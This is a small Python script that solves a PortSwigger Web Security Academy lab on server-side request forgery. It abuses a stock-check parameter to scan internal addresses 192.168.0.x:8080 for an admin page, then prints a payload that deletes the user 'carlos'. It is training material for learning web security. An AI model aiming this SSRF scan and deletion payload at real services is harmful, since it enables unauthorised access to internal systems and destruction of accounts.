# Simple python program made to solve the following lab:
# https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

import requests

SUB_DOMAIN = "" # Insert Lab Sub-Domain Here
LAB_URL = "https://" + SUB_DOMAIN + ".web-security-academy.net"

def main():

    PRODUCT_PATH = "/product/stock"
    FIRST_THREE_OCTETS = "192.168.0."
    SCHEME = "http://"
    PORT_AND_PATH = ":8080/admin"
    DELETE_USER_PATH = "/delete?username=carlos"
    SUCCESS_STATUS = 200

    for last_octet in range(1, 256):
        ip_address = FIRST_THREE_OCTETS + str(last_octet)
        data = {"stockApi": SCHEME + ip_address + PORT_AND_PATH}
        response = requests.post(LAB_URL + PRODUCT_PATH, data = data)
        status = response.status_code
        print(f"Status code for Admin page at {ip_address}: {status}")
        if status == SUCCESS_STATUS:
            print(f"Admin page possibly found at IP Address: {ip_address}")
            print(f"To solve lab, send POST request to {PRODUCT_PATH} with the following POST data:")
            print(f"stockApi={SCHEME + ip_address + PORT_AND_PATH + DELETE_USER_PATH}")
            return 0
    return 1

if __name__ == "__main__":
    main()
